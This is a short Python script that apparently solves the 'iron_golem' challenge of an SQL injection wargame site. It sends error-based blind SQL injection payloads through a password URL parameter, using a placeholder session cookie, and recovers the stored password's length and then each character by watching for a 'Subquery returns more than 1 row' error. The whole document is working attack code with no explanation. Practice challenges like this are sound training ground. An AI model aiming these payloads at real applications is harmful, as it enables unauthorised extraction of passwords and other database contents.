import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,101):
    url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?\
            pw=1234' or (SELECT IF(length(pw)=%d,1,(SELECT 1 UNION SELECT 2)))%%23" % i
    res = requests.get(url, cookies=cookie)
    
    if not "Subquery returns more than 1 row" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break

pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?\
                pw=1234' or (SELECT IF(ascii(substr(pw,%d,1))=%d,1,(SELECT 1 UNION SELECT 2)))%%23" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if not "Subquery returns more than 1 row" in res.text:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break